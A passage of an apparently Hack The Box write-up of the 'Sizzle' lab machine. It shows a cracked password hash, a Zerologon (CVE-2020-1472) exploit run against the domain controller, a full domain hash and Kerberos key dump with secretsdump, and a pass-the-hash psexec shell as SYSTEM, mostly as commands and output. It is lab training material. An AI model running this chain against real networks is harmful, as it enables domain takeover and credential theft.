+AMANDA::HTB:86c0335d88d43520:103eb57be6b34f59ed9721cf15b92335:010100000000000080ee9ec0f4ccdc015ea13d572a34b0590000000002000800590058004400530001001e00570049004e002d004e004200490038003000390050004d0030003300590004003400570049004e002d004e004200490038003000390050004d003000330059002e0059005800440053002e004c004f00430041004c000300140059005800440053002e004c004f00430041004c000500140059005800440053002e004c004f00430041004c000700080080ee9ec0f4ccdc01060004000200000008003000300000000000000001000000002000007f8946a95dc4c9a5217bf48dc3c2a224be254fac65f2034534200e8f6f1797350a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0039003000000000000000000000000000:Ashare1972</code></pre><p>The hash cracked!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">amanda:Ashare1972</code></pre><p>Ill verify these credentials</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb sizzle.htb.local -u &#39;amanda&#39; -p &#39;Ashare1972&#39;                                                                              
+SMB         10.129.19.191   445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.19.191   445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972</code></pre><p>This user is compromised</p><h2>Domain Admin via zerologon</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb sizzle.htb.local -u &#39;amanda&#39; -p &#39;Ashare1972&#39; -M zerologon                     
+SMB         10.129.19.191   445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.19.191   445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972 
+ZEROLOGON   10.129.19.191   445    SIZZLE           VULNERABLE
+ZEROLOGON   10.129.19.191   445    SIZZLE           Next step: https://github.com/dirkjanm/CVE-2020-1472</code></pre><p>This version is vulnerable to zerologon</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 cve-2020-1472-exploit.py SIZZLE 10.129.19.191                                                                        
+Performing authentication attempts...
+=======================================================================================================================================
+Target vulnerable, changing account password to empty string
+
+Result: 0
+
+Exploit complete!</code></pre><p>This set the DC machine account password to an empty string so now i should be able to perform a DCSync</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">impacket-secretsdump -no-pass SIZZLE\$@10.129.19.191 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
+mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
+SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SIZZLE:4102:aad3b435b51404eeaad3b435b51404ee:dce911fab66919eac6b0e9642a664914:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
+Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
+Administrator:des-cbc-md5:ad7afb706715e964
+krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
+krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
+krbtgt:des-cbc-md5:866db35eb9ec5173
+amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
+amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
+amanda:des-cbc-md5:70ba677a4c1a2adf
+mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
+mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
+mrlky:des-cbc-md5:02f1a4da0432f7f7
+sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
+sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
+sizzler:des-cbc-md5:5d51d30e68d092d9
+SIZZLE$:aes256-cts-hmac-sha1-96:6ecf1fe4c6bf3af55197960feba8a92dd8d321e18b688006a9bb09c91725f3a7
+SIZZLE$:aes128-cts-hmac-sha1-96:f98d2b4ca1357ba73c4f7c17f104bd11
+SIZZLE$:des-cbc-md5:92bf08aee6a16129
+SIZZLE:aes256-cts-hmac-sha1-96:ed2668745f5d855178849f940922fa590ead78adfa28933b91eee6c598d405c0
+SIZZLE:aes128-cts-hmac-sha1-96:7467d76a4f41bf7ebf02fc3aa25a35eb
+SIZZLE:des-cbc-md5:15c4d3ef49efcd4f
+[*] Cleaning up...</code></pre><p>I now have all the hashes but looking at bloodhound the domain admins are <code>administrator</code> and <code>sizzler</code> and neither of these are part of the remote management users group</p><p>So ill have to use <code>wmiexec</code> or <code>psexec</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">impacket-psexec htb.local/sizzler@sizzle.htb.local -hashes &#39;:d79f820afad0cbc828d79e16a6f890de&#39;                                                                    
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on sizzle.htb.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file NCGyjYuQ.exe
+[*] Opening SVCManager on sizzle.htb.local.....
+[*] Creating service bASB on sizzle.htb.local.....
+[*] Starting service bASB.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+
+C:\Windows\system32&gt;</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">C:\Users\administrator\Desktop&gt; type root.txt
+
+
+C:\Users\administrator\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State   
+========================================= ================================================================== ========
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeTcbPrivilege                            Act as part of the operating system                                Enabled 
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
+SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Enabled 
+SeAuditPrivilege                          Generate security audits                                           Enabled 
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
+SeTimeZonePrivilege                       Change the time zone                                               Enabled 
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
+
+C:\Users\administrator\Desktop&gt; </code></pre><p>Full domain compromise using zerologon</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-sendai/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Sendai</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-sweep/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Sweep</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
